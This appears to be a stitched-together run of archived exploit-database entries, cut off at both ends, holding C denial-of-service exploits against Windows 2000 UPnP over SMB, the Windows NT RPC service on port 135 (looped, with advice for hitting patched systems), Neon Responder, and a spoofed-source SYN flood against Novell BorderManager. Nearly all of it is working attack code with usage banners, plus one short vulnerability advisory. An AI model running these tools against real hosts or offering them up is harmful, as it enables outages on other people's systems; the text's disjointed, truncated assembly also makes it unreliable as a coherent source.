"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x00\x00\x00\x08\x00\x00\x01\x00\x00\x00";

char *setup_tCon(char *UNC, char *ptr)
{
       int pindex = 0, uindex = 0, len;

       len = strlen(UNC);
       while (uindex < len) {
               if ((pindex % 2) != 0) {
                       ptr[pindex] = '\x00';
                       pindex++;
                       continue;
               }

               ptr[pindex] = UNC[uindex];
               uindex++;
               pindex++;
       }

       ptr[pindex] = '\x00';
       pindex++;
       ptr[pindex] = '\x00';
       pindex++;
       ptr[pindex] = '\x00';
       pindex++;
       ptr[pindex] = 'I'; pindex++; ptr[pindex] = 'P'; pindex++; ptr[pindex] ='C'; pindex++;
       ptr[pindex] = '\x00';
       pindex++;
       ptr[pindex] = '\x00';
       pindex++;
}

int main(int argc, char *argv[])
{
       struct sockaddr_in target;
       struct hostent *host;
       int sock;
       char response[4096];
       char UNC[50], tConXpacket[150], *temp;
       char targetIP[20];
       int nread, ret, templen;

       if (argc < 2) {
               printf("Usage: upnp_getdevicelist_DOS <host name|ip address>\n");
               exit(-1);
       }


printf("\n==========================================\n");
       printf("WIN2K UPNP interface DOS Attack\n");
       printf("Coded by Winny Thomas :-) \n");

printf("==========================================\n\n");

       printf("[*] Resolving %s: ", argv[1]);
       host = gethostbyname(argv[1]);
       if (host == NULL) {
               printf("\033[0;31mFailed\033[0;39m\n");
               exit(-1);
       }
       printf("\033[0;32mOK\033[0;39m\n");

       target.sin_family = AF_INET;
       target.sin_addr = *(struct in_addr*)host->h_addr;
       target.sin_port = htons(445);

       sprintf(targetIP, "%s", inet_ntoa(target.sin_addr));
       sock = socket(AF_INET, SOCK_STREAM, 0);
       if ((ret = connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr))) < 0) {
               perror("Connect");
               exit(-1);
       }

       printf("[*] SMB Negotiation with %s: ", argv[1]);
       if ((send(sock, SMB_Negotiate, sizeof(SMB_Negotiate)-1, 0)) < 0) {
               perror("SMB Negotiate");
               exit(-1);
       }
       ret = recv(sock, response, 4096, 0);
       if ((ret < 10 || response[9] != 0)) {
               printf("\033[0;31mFailed\033[0;39m\n");
               exit(-1);
       }
       printf("\033[0;32mOK\033[0;39m\n");

       printf("[*] SMB Session setup ANDX 1 with %s: ", argv[1]);
       if ((send(sock, SMB_Session_setup_ANDX1, sizeof(SMB_Session_setup_ANDX1)-1, 0)) < 0) {
               perror("SMB_Session_setup_ANDX1");
               exit(-1);
       }
       ret = recv(sock, response, 4096, 0);
       if (ret <= 10) {
               printf("\033[0;31mFailed\033[0;39m\n");
               exit(-1);
       }
       printf("\033[0;32mOK\033[0;39m\n");

       printf("[*] SMB Session setup ANDX 2 with %s: ", argv[1]);
       if ((send(sock, SMB_Session_setup_ANDX2, sizeof(SMB_Session_setup_ANDX2)-1, 0)) < 0) {
               perror("SMB_Session_setup_ANDX2");
               exit(-1);
       }
       ret = recv(sock, response, 4096, 0);
       if ((ret <= 10 || response[9] != 0)) {
               printf("\033[0;31mFailed\033[0;39m\n");
               exit(-1);
       }
       printf("\033[0;32mOK\033[0;39m\n");

       temp = tConXpacket;
       printf("[*] SMB Tree Connect ANDX with %s: ", argv[1]);
       memcpy(tConXpacket, SMB_TreeConnect_ANDX, sizeof(SMB_TreeConnect_ANDX)-1);
       temp += sizeof(SMB_TreeConnect_ANDX) -1;
       sprintf(UNC, "\\\\%s\\IPC$", targetIP);
       setup_tCon(UNC, temp);
       templen = (strlen(UNC)*2) +9;
       tConXpacket[3] = 43 + templen;
       templen -= 2;
       memcpy((unsigned long *)&tConXpacket[45], &templen, 1);
       if ((send(sock, tConXpacket, (sizeof(SMB_TreeConnect_ANDX) + templen), 0)) < 0) {
               perror("SMB_TreeConnect_ANDX");
               exit(-1);
       }
       ret = recv(sock, response, 4096, 0);
       if ((ret <= 10 || response[9] != 0)) {
               printf("\033[0;31mFailed\033[0;39m\n");
               exit(-1);
       }
       printf("\033[0;32mOK\033[0;39m\n");

       printf("[*] SMB NT Create ANDX Request to %s: ", argv[1]);
       if ((send(sock, SMB_NTCreate_ANDX_Request, sizeof(SMB_NTCreate_ANDX_Request)-1, 0)) < 0) {
               perror("SMB_NTCreate_ANDX_Request");
               exit(-1);
       }
       ret = recv(sock, response, 4096, 0);
       if (ret <= 10) {
               printf("\033[0;31mFailed\033[0;39m\n");
               exit(-1);
       }
       printf("\033[0;32mOK\033[0;39m\n");

       printf("[*] DCERPC Bind to UPNP RPC Service at %s: ", argv[1]);
       if ((send(sock, DCERPC_Bind_RPC_Service, sizeof(DCERPC_Bind_RPC_Service)-1, 0)) < 0) {
               perror("DCERPC_Bind_RPC_Service");
               exit(-1);
       }
       ret = recv(sock, response, 4096, 0);
       if (ret <= 10) {
               printf("\033[0;31mFailed\033[0;39m\n");
               exit(-1);
       }
       printf("\033[0;32mOK\033[0;39m\n");

       printf("[*] PNP_GetDeviceList request to %s: ", argv[1]);
       send(sock, PNP_GetDeviceList_Request, sizeof(PNP_GetDeviceList_Request)-1, 0);
       recv(sock, response, 4096, 0);
       printf("\033[0;32mOK\033[0;39m\n");
}

// milw0rm.com [2005-10-24]
source: http://www.securityfocus.com/bid/6005/info
 
The Microsoft Windows RPC service contains a flaw that may allow a remote attacker to cause a denial of service. By sending a specifically malformed packet to TCP port 135, the RPC service will be disabled.
 
This vulnerability was originally reported to only affect Windows 2000. Microsoft has confirmed that Windows NT 4.0 and XP are also vulnerable.
 
It has been reported that installation of the provided patch will cause some problems in IIS environments. Specifically, users who are using COM+ in IIS environments may experience problems with ASP transactions.
 
A variant of this issue has been reported which allegedly affects patched systems. It is apparently possible to trigger this variant by flooding a system with malformed packets. 

/*
* Microsoft Windows NT RPC Service Denial of Service Vulnerability
*
* Orginal Code By Lion @ http://www.cnhonker.com
* Upgraded By Trancer @ http://BinaryVision.tech.nu
*
* I have notice that even after a Windows NT system is patched aginst this
vulnerability with an offical M$ update,
* an attacker can still DoS that system if he activate this exploit a lot
of times, fast.
* So I've upgraded the exploit by looping it and letting you control the
times you want to nuke a system
* (with a patched 2000\XP 250-400 times is recommended).
*
* That's it. enjoy :-)
\*

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char sendcode1[] =
  "\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x02\x00\x00\x00"
  "\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
  "\x60\x9e\xe7\xb9\x52\x3d\xce\x11\xaa\xa1\x00\x00\x69\x01\x29\x3f"
  "\x02\x00\x02\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
  "\x2b\x10\x48\x60\x02\x00\x00\x00\x05\x00\x00\x01\x10\x00\x00\x00"
  "\xd0\x16\x00\x00\x8f\x00\x00\x00\x20\x27\x01\x00\x00\x00\x02\x00"
  "\xf0\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x00\x00";

char sendcode2[] =
  "\x88\x13\x00\x00\x00\x00\x00\x00\x88\x13\x00\x00";

char sendcode3[] =
  "\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00";

char sendcode4[] =
  "\xfe\xff\x00\x00\x00\x00\x00\x00\xfe\xff\x00\x00\x3d\x3d\x3d\x3d"
  "\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
  "\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
  "\x50\x10\x01\x00\x00\x00\x02\x00";

char sendcode5[] =
  "\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
  "\x80\xf9\x00\x00\x00\x00\x02\x00";

char sendcode6[] =
  "\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
  "\xb0\xe2\x00\x00\x00\x00\x02\x00";

char sendcode7[] =
  "\x05\x00\x00\x02\x10\x00\x00\x00\x60\x15\x00\x00\x8f\x00\x00\x00"
  "\x60\x15\x00\x00\x00\x00\x02\x00";

char sendcode8[] =
  "\x00\x00\x01\x10\x00\x00\x00\x00\x00\x00\x01\x10\x00\x00";

int main(int argc, char *argv[])
{
  WSADATA wsaData;
  WORD wVersionRequested;
  struct hostent *pTarget;
  struct sockaddr_in sock;
  char *targetip;
  int port,bufsize,times,i;
  SOCKET s;
  char buffer[20480];

  printf("======================= Windows NT Multi RPC Nuke V0.12
======================\r\n");
  printf("=============== Orginal Code By Lion @ http://www.cnhonker.com
===============\r\n");
  printf("============= Upgraded By Trancer @ http://BinaryVision.tech.nu
==============\r\n\n");

  if (argc < 2)
  {
    printf("Usage:\r\n");
    printf(" %s <TargetIP> <TargetPort> <BufferSize> <Times>\r\n", argv[0]);
    printf("Exaple: %s 198.167.0.1 135 512 250\r\n", argv[0]);
    printf("PS:\r\n");
    printf(" If target is XP, try 2 times.\r\n");
    exit(1);
  }

  wVersionRequested = MAKEWORD(1, 1);
  if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

  targetip = argv[1];
  port = 135;
  if (argc >= 3) port = atoi(argv[2]);
  bufsize = 512;
  if (argc >= 4) bufsize = atoi(argv[3]);
  times = 1;
  if (argc >= 5) times = atoi(argv[4]);

  for (i = 0; i < times; i = i + 1)
  {

    s = socket(AF_INET, SOCK_STREAM, 0);
    if(s==INVALID_SOCKET)
    {
      printf("Socket error!\r\n");
      exit(1);
    }

    printf("Resolving Hostnames...\n");
    if ((pTarget = gethostbyname(targetip)) == NULL)
    {
      printf("Resolve of %s failed, please try again.\n", argv[1]);
      exit(1);
    }

    memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
    sock.sin_family = AF_INET;
    sock.sin_port = htons((USHORT)port);

    printf("Connecting...\n");
    if ( (connect(s, (struct sockaddr *)&sock, sizeof (sock) )))
    {
      printf("Couldn't connect to host.\n");
      exit(1);
    }

    printf("Connected!...\n");
    printf("Sending Packets...\n");
    if (send(s, sendcode1, sizeof(sendcode1)-1, 0) == -1)
    {
      printf("Error sending nuke Packets\r\n");
      closesocket(s);
      exit(1);
    }

    memset(&buffer, '\x41', 240);
    send(s, buffer, 240, 0);

    send(s, sendcode2, sizeof(sendcode2)-1, 0);
    memset(&buffer, '\x42', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode3, sizeof(sendcode3)-1, 0);
    memset(&buffer, '\x43', 512);
    send(s, buffer, 512, 0);

    send(s, sendcode4, sizeof(sendcode4)-1, 0);
    memset(&buffer, '\x44', 20480);
    send(s, buffer, 20480, 0);

    memset(&buffer, '\x44', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode5, sizeof(sendcode5)-1, 0);
    memset(&buffer, '\x45', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode6, sizeof(sendcode6)-1, 0);
    memset(&buffer, '\x46', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode7, sizeof(sendcode7)-1, 0);
    memset(&buffer, '\x47', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode8, sizeof(sendcode8)-1, 0);
    memset(&buffer, '\x48', 5000);
    send(s, buffer, 5000, 0);
    i = i + 1;
  }

  if (times < 2)
  {
    printf("Nuked! If target is XP, try a again! :)\r\n");
  }
  else
  {
    printf("%s was nuked %s times\r\n", argv[1], argv[4]);
  }

  closesocket(s);
  WSACleanup();
  return 0;
}
/* Stefan Lochbihler*/

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#define PORT 4347
char CLOCK_MSG [] = "\x00\x0e\x5a\x00\x4c\xe9\x24\xb1\x17\x88\x40\x84";   //Password = ""

void usage (char*);
void endpgr (char *,SOCKET, char*);
unsigned long gethost (char *);


int main(int argc, char *argv[])
{

   WSADATA wsa;
   SOCKET client;
   sockaddr_in peer;
   WORD wsVersion;

   char sendbuffer[16]="";
   char recvbuffer[16]="";
   unsigned long host=0;
   int err=0;

   if(argc<2)
     usage(argv[0]);

   printf("\n~~~~~~ Neon Responder DoS - (c) by Stefan Lochbihler ~~~~~~\n\n");


   if(WSAStartup(wsVersion=MAKEWORD(2,2),&wsa)!=0)
   {
       printf("WSAStartup() fail\n");
       exit(0);
   }

   printf("%s:[+] Try to create socket\n",argv[0]);
   client=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if(client==INVALID_SOCKET)
      endpgr(argv[0],client,"[-] socket() fail");

   printf("%s:[+] Lookup host\n",argv[0]);
   if(!(host=gethost(argv[1])))
      endpgr(argv[0],client,"[-] host not found !");

   peer.sin_family = AF_INET;
   peer.sin_port = htons(PORT);
   peer.sin_addr.s_addr = host;

   printf("%s:[+] Connect to %s\n",argv[0],argv[1]);
   err=connect(client,(SOCKADDR*)&peer,sizeof(struct sockaddr_in));
   if(err)
     endpgr(argv[0],client,"[-] connect() fail");

   memcpy(sendbuffer,CLOCK_MSG,sizeof(CLOCK_MSG));

   printf("%s:[+] Try to send packet\n",argv[0]);
   err=send(client,sendbuffer,sizeof(sendbuffer),0);
   err=recv(client,recvbuffer,sizeof(recvbuffer)-1,0);

   endpgr(argv[0],client,"[+] End successfully");

   return 0;

}

void usage(char *pgrname)
{
printf("\n~~~~~~ Neon Responder DoS - (c) by Stefan Lochbihler ~~~~~~\n\n");
printf("%s: <Targethost>\n",pgrname);
exit(0);
}

void endpgr (char *pgrname, SOCKET client,char *msg)
{
   printf("%s:%s\n",pgrname,msg);
   WSACleanup();
   closesocket(client);
   exit(0);
}

unsigned long gethost(char *targethost)
{
unsigned long host=0;
hostent *phost=NULL;


host=inet_addr(targethost);
if(host==INADDR_NONE)
{
   if((phost=gethostbyname(targethost))==NULL)
      return 0;
   host=*(unsigned long*)phost->h_addr;
}

return host;
}

// milw0rm.com [2006-04-17]
/* 29.4.2001 honoriak@mail.ru
   Proof of concept DoS Novell BorderManager Enterprise Edition 3.5
   helisec
   DoSs are lame, i know, but boredom is ugly. DON'T ABUSE.
   greets: jimjones, doing, darkcode for his paper about raw sockets 
   and all helisec guys.
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>  
#include <sys/types.h>
#include <sys/stat.h> 
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>

#define __FAVOR_BSD
#include <netinet/tcp.h>

#define PORT 353 

 /* to be easier the processing, this struct :) */
 
 struct pseudohdr {
         struct in_addr saddr;
         struct in_addr daddr;
         u_char zero;
         u_char protocol;
         u_short len;
         struct tcphdr tcpheader;
     }pseudoh;
                                    

unsigned long resolve(name)  
	char *name;
 {

struct in_addr h2;
struct hostent *hname;

if (!(hname = gethostbyname(name))) return(0);
memcpy((char *)&h2.s_addr, hname->h_addr, hname->h_length);
return(h2.s_addr);
}
               
 /* checksum ripped and modified by me */
 
u_short
checksum (data, length)
	u_short *data;
	u_short length;
{

register long value;
u_short i;
    
      for (i = 0; i < (length >> 1); i++)
       value += data[i];
          
       if ((length & 1) == 1)
       value += (data[i] << 8);
                
       value = (value & 65535) + (value >> 16);
                  
       return (~value);
}
                    

void packet(vic, socket) 
	struct sockaddr_in *vic;
	int socket;
 {
 
 int count;
 char buf[40];
                     
 struct ip *ipheader = (struct ip *)buf;
 struct tcphdr *tcpheader = (struct tcphdr *)(buf + sizeof(struct ip));
 
 bzero (&buf, (sizeof(struct ip) + sizeof(struct tcphdr)) );
 
 	/* filling ip struct */
 	
 	ipheader->ip_v = IPVERSION;
 	ipheader->ip_hl = 5;
 	ipheader->ip_tos = htons(0);
 	ipheader->ip_len = htons(sizeof(buf));
 	ipheader->ip_id = rand() % 0xffff;
 	ipheader->ip_off = htons(0);
 	ipheader->ip_ttl = 0xff;  /* 255 hex */
 	ipheader->ip_p = IPPROTO_TCP;
 	ipheader->ip_src.s_addr = rand();
 	ipheader->ip_dst.s_addr = vic->sin_addr.s_addr;
 	ipheader->ip_sum = 0;
 	
 	/* filling tcphdr struct */
 	
 	tcpheader->th_sport = 2424; /* random */
 	tcpheader->th_dport = vic->sin_port;
 	tcpheader->th_seq = htonl(0xF1C); /* random */
 	tcpheader->th_ack = 0;
 	tcpheader->th_off = 5;
 	tcpheader->th_flags = TH_SYN; /* the important flag */
 	tcpheader->th_win = 4096;
 	tcpheader->th_sum = 0;   
 	

 bzero (&pseudoh, 12 + sizeof(struct tcphdr));
 pseudoh.saddr.s_addr = rand();
 pseudoh.daddr.s_addr = vic->sin_addr.s_addr;
 pseudoh.protocol = 6;
 pseudoh.len = htons (sizeof(struct tcphdr));
 memcpy((char *)&pseudoh.tcpheader, (char *)tcpheader, sizeof (struct tcphdr));
 tcpheader->th_sum = checksum((u_short *)&pseudoh, 12 + sizeof (struct tcphdr));
  
 /* sending packets, DON'T ABUSE! */

for (count = 0; count < 260; count++) {
  if ( (sendto(socket, 
 	   buf, 
 	   (sizeof(struct iphdr) + sizeof(struct tcphdr)), 
 	   0, 
 	   (struct sockaddr *)vic, 
 	   sizeof(struct sockaddr_in))) < 0) {
 	   fprintf(stderr, "Error sending packets\n"); 
           exit(-1);
           }              
      }                              	                                                    
close (socket);
  }
 
void usage(proggy) 
	char *proggy;
 {
	fprintf(stderr,"DoS a Novell BorderManager Enterprise Edition 3.5\n");
	fprintf(stderr, "honoriak@mail.ru from helisec\n");
	fprintf(stderr, "Usage: %s host\n", proggy);
	exit(0);
	}

main(argc, argv) 
	int argc;
	char *argv[];
	
 {
  
  struct sockaddr_in h;
  int s0ck, uno = 1;
  
  if (argc < 2)
  	{
  	usage(argv[0]);
  	}
  	
  bzero(&h, sizeof(h)); 
  h.sin_family = AF_INET;   
  h.sin_port = htons(PORT); 

